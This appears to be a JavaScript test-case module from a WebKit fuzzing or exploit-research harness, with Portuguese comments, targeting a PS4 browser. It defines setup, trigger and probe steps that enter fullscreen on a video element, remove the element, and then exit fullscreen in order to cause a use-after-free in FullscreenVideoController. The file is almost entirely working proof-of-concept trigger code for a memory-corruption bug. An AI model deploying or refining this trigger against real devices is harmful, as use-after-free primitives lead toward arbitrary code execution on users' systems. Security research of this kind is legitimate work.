/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE
 * Superfície C++: FullscreenVideoController.cpp / MediaPlayerPrivateManx.cpp
 * Risco: HIGH
 *
 * Diferença para a versão genérica:
 *   - O trigger agora ENTRA em fullscreen antes de destruir o elemento.
 *     O bug original exige que o FullscreenVideoController esteja ativo
 *     no momento do free — sem requestFullscreen(), o controller nunca
 *     é construído e o UAF não ocorre.
 *   - Espera 80ms antes do remove() para garantir que o objeto C++
 *     MediaPlayerPrivate foi completamente inicializado pelo pipeline nativo.
 *   - Dispara webkitExitFullscreen() APÓS o remove() para acionar o
 *     controller sobre o ponteiro freed.
 *   - Probes acessam propriedades que lêem direto do objeto C++ nativo
 *     (não cacheadas pelo wrapper JS): videoWidth, videoHeight, buffered.
 *
 * Ciclo de vida C++ relevante:
 *   HTMLMediaElement → MediaPlayerPrivate (criado no load)
 *   FullscreenVideoController → mantém raw ptr para MediaPlayerPrivate
 *   remove() → refcount DOM cai para 0 → MediaPlayerPrivate::~MediaPlayerPrivate()
 *   webkitExitFullscreen() → FullscreenVideoController acessa ptr freed (UAF)
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'HIGH',
    description:
        'HTMLVideoElement.remove() com FullscreenVideoController ativo. ' +
        'O controller mantém raw ptr para MediaPlayerPrivate. ' +
        'Se remove() zerar o refcount antes de webkitExitFullscreen(), ' +
        'o controller derreferencia ponteiro freed.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);

        this.video = document.createElement('video');
        this.video.setAttribute('playsinline', '');
        this.video.setAttribute('preload', 'auto');
        this.video.setAttribute('controls', '');
        this.video.style.cssText = 'width:320px;height:240px;position:absolute;top:0;left:0';

        // MP4 mínimo válido — força criação do MediaPlayerPrivate nativo
        // (sem src válido o pipeline não é instanciado)
        this.video.src = 'data:video/mp4;base64,'
            + 'AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';

        this.container.appendChild(this.video);

        // Aguarda o elemento entrar em estado HAVE_METADATA (readyState >= 1)
        // para garantir que MediaPlayerPrivate está construído
        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        // Tenta entrar em fullscreen — isso instancia o FullscreenVideoController
        try {
            const fsPromise = this.video.webkitRequestFullscreen?.()
                           ?? this.video.requestFullscreen?.();
            if (fsPromise) await Promise.race([
                fsPromise,
                new Promise(r => setTimeout(r, 80)) // timeout de segurança
            ]);
        } catch(e) { /* PS4 pode bloquear fora de gesture — ignorar */ }

        // Pequena janela: controller inicializado, objeto ainda vivo
        await new Promise(r => setTimeout(r, 30));

        // FREE: remove() zera o refcount DOM → ~MediaPlayerPrivate()
        this.video.remove();

        // ACESSO PÓS-FREE: controller tenta acessar o MediaPlayerPrivate freed
        document.webkitExitFullscreen?.();
        document.exitFullscreen?.().catch(() => {});
    },

    probe: [
        // Propriedades que lêem diretamente do objeto C++ (não cacheadas)
        s => s.video.duration,
        s => s.video.currentTime,
        s => s.video.readyState,
        s => s.video.networkState,
        s => s.video.videoWidth,
        s => s.video.videoHeight,
        s => s.video.buffered?.length,
        s => s.video.buffered?.start(0),   // Acessa TimeRanges interno — C++ puro
        s => s.video.buffered?.end(0),
        s => s.video.played?.length,
        s => s.video.seekable?.length,
        s => s.video.error?.code,
        s => s.video.paused,
        s => s.video.ended,
        s => s.video.seeking,
        // webkitDecodedFrameCount é implementado diretamente no MediaPlayer nativo
        s => s.video.webkitDecodedFrameCount,
        s => s.video.webkitDroppedFrameCount,
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        try { document.exitFullscreen?.(); } catch(e) {}
    }
};
